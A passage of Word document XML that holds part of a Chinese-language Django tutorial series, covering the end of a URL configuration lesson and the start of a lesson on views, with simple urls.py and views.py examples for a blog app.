          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('', views.ArticleList.as_view(), name='article_list', {'blog_id': 3}),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55319587" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    re_path(r'^blog/article/(?P&lt;id&gt;\d+)/$', views.article, name='article'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7266BB9E" w14:textId="2255642F" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B676BCF" w14:textId="3952E316" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>未完待续。接下来我们会介绍视图的编写，模板的设计和表单的使用。Django教程与案例每日更新。欢迎订阅我的公众号【</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Python与Django大咖之路</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>】成就你的人生梦想。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65413067" w14:textId="4FC37A73" w:rsidR="001C47AF" w:rsidRDefault="00995934" w:rsidP="00995934">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012</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId237" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django基础核心技术介绍(3): View视图详解与通用视图</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5A9212FE" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django核心基础(3): View视图详解。一旦你使用通用视图，你就会爱上她。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30EF86F5" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 Yunbo Shi </w:t>
      </w:r>
      <w:hyperlink r:id="rId238" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-05-18</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70193DB7" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13619815" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础连载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5662A5" w14:textId="1DF6F599" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django网络应用开发的</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>5项基础核心技术</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>包括</w:t>
      </w:r>
      <w:hyperlink r:id="rId239" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>模型（Model）的设计</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:hyperlink r:id="rId240" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>URL的设计与配置</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>，View（视图）的编写，Template（模板）的设计和Form(表单)的使用。今天小编我就来拼个老命给你来介绍下第三项Django核心基础知识之View视图的编写吧, 并详细介绍下如何自定义使用Django自带的</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>通用视图。一旦你开始使用Django自带通用视图，你就会爱上她，根本停不下来。想持续了解后续Django Web开发技术请订阅我的公众号【</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Python与Django大咖之路</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>】。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030027A9" w14:textId="3B0A5E75" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>什么是View视图? Django的View是如何工作的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B288814" w14:textId="679F34BF" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的Web开发也遵循经典软件设计开发的</w:t>
      </w:r>
      <w:hyperlink r:id="rId241" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>MVC模式</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>。View (视图) 主要根据用户的请求返回数据，用来展示用户可以看到的内容(比如网页，图片)，也可以用来处理用户提交的数据，比如保存到数据库中。Django的视图(View）通常和URL路由一起工作的。服务器在收到用户通过浏览器发来的请求后，会根据urls.py里的关系条目，去视图View里查找到与请求对应的处理方法，从而返回给客户端http页面数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF93AA9" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们先看一个最简单的视图View。当用户发来一个请求request时，我们通过HttpResponse打印出Hello， World!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CFC8408" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19FB3F2D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.http import HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="380C3CDC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="162F0E57" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="104C459B" w14:textId="4887A0C2" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return HttpResponse("Hello， World!")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5917077A" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>这个例子过于简单。在实际Web开发过程中，我们的View不仅要负责从数据库提取数据，还需要指定显示内容的模板，并提供模板渲染页面所需的内容对象(context object)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6386A7B0" w14:textId="2645ED9C" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FDBF902" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们再来看看下面一个新闻博客的例子。/blog/展示所有博客文章列表。/blog/article/&lt;int:id&gt;/展示一篇文章的详细内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2848AACB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB25053" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CFB17FC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6669081D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from . import views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA95E11" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3843CF17"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0ADC8161" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('blog/', views.index, name='index'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131F12F4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   path('blog/article/&lt;int:id&gt;/', views.article_detail, name='article_detail'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1FB6AA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622FD424" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39947D5A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D6EB1C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.shortcuts import render, get_object_or_404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AADFC85"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2EFD85B6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35AEFA6E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 展示所有文章</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A8B1377" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="420F3D3D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    latest_articles = Article.objects.all().order_by('-pub_date')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5944BF93" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return render(request, 'blog/article_list.html', {"latest_articles": latest_articles})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="632DDDF4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70F73BF9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 展示所有文章</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F5326AA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def article_detail(request, id):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF87BF1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    article = get_object_or_404(Article, pk=id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74EC950B" w14:textId="23FF0F3E" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return render(request, 'blog/article_detail.html', {"article": article})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="331EC69A" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
